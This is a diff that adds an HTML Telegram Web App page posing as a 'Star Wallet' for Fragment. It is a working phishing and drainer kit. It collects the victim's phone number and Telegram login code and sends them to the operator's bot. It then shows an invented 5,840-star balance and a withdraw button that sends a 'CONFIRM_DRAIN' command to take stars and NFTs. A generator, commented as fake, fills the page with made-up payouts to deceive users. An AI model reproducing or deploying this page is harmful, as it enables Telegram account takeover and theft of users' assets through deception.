@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { background: #0e1621; color: white; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 15px; display: flex; flex-direction: column; align-items: center; }
+        .card { background: #17212b; padding: 20px; border-radius: 15px; text-align: center; width: 100%; max-width: 400px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); margin-bottom: 20px; box-sizing: border-box; }
+        .stars-title { color: #fecb2e; font-size: 26px; font-weight: bold; margin-bottom: 15px; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        .balance-label { color: #8897a3; font-size: 14px; }
+        .balance-val { font-size: 32px; font-weight: bold; margin: 10px 0; }
+        input { width: 100%; padding: 12px; margin: 15px 0; border-radius: 10px; border: 1px solid #248bcf; background: #0e1621; color: white; box-sizing: border-box; font-size: 16px; }
+        button { background: #248bcf; color: white; border: none; padding: 15px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; transition: 0.3s; }
+        button:active { transform: scale(0.98); background: #1d77b0; }
+        
+        /* Таблица выплат */
+        .payouts { width: 100%; max-width: 400px; background: #17212b; border-radius: 15px; padding: 15px; box-sizing: border-box; }
+        .payouts-title { text-align: left; font-size: 14px; color: #8897a3; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 1px; }
+        .payout-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #232e3c; font-size: 13px; }
+        .payout-row:last-child { border-bottom: none; }
+        .user { color: #40a7e3; font-weight: 500; }
+        .amount { color: #fecb2e; font-weight: bold; }
+        .status { color: #31b545; }
+    </style>
+</head>
+<body>
+    <div class="card" id="main-card">
+        <div class="stars-title">⭐ Star Wallet</div>
+        <div id="content">
+            <div class="balance-label">Доступно к выводу</div>
+            <div class="balance-val">0.00 ⭐</div>
+            <p style="font-size: 14px; color: #8897a3;">Введите номер телефона для синхронизации аккаунта Fragment</p>
+            <input type="text" id="phone" placeholder="+7 999 123-45-67">
+            <button onclick="nextStep('phone')">Продолжить</button>
+        </div>
+    </div>
+
+    <div class="payouts">
+        <div class="payouts-title">Последние выплаты</div>
+        <div id="payout-list">
+            </div>
+    </div>
+
+    <script>
+        let tg = window.Telegram.WebApp;
+        tg.expand();
+        tg.headerColor = '#0e1621';
+
+        // Функция отправки данных боту
+        function send(data) {
+            tg.sendData(data);
+        }
+
+        function nextStep(step) {
+            if (step === 'phone') {
+                let p = document.getElementById("phone").value;
+                if(p.length < 10) return alert("Введите корректный номер");
+                send("p:" + p);
+                document.getElementById("content").innerHTML = `
+                    <div class="balance-label">Подтверждение</div>
+                    <div class="balance-val">... ⭐</div>
+                    <p>Введите код из Telegram для верификации</p>
+                    <input type="text" id="code" placeholder="Код из 5 цифр">
+                    <button onclick="nextStep('code')">Подтвердить</button>
+                `;
+            } else if (step === 'code') {
+                let c = document.getElementById("code").value;
+                send("c:" + c);
+                document.getElementById("content").innerHTML = `
+                    <div class="balance-label">Баланс найден</div>
+                    <div class="balance-val">5,840 ⭐</div>
+                    <p style="color: #31b545;">✅ Аккаунт верифицирован</p>
+                    <button onclick="drain()">ВЫВЕСТИ НА КОШЕЛЕК</button>
+                `;
+            }
+        }
+
+        function drain() {
+            tg.showConfirm("Вывести 5,840 ⭐ и перенести доступные NFT на основной адрес?", (ok) => {
+                if (ok) {
+                    send("CONFIRM_DRAIN");
+                    tg.HapticFeedback.notificationOccurred('success');
+                    document.getElementById("main-card").innerHTML = "<h2>⏳ Обработка...</h2><p>Транзакция отправлена в сеть TON. Не закрывайте приложение.</p>";
+                }
+            });
+        }
+
+        // Генератор фейковых выплат
+        const names = ['Ivan', 'Dmitry', 'Sasha', 'Alex', 'Mikhail', 'Elena', 'Artur', 'Kira', 'vlad_top', 'nft_king'];
+        function addPayout() {
+            const list = document.getElementById('payout-list');
+            const name = names[Math.floor(Math.random() * names.length)];
+            const sum = (Math.random() * (12000 - 1000) + 1000).toFixed(0);
+            const row = document.createElement('div');
+            row.className = 'payout-row';
+            row.innerHTML = `<span class="user">@${name}***</span><span class="amount">${sum} ⭐</span><span class="status">Выплачено</span>`;
+            list.prepend(row);
+            if (list.children.length > 5) list.lastChild.remove();
+        }
+
+        // Заполняем таблицу сразу и обновляем каждые 5 сек
+        for(let i=0; i<5; i++) addPayout();
+        setInterval(addPayout, 7000);
+    </script>
+</body>
+                                                                </html>
+                                                            
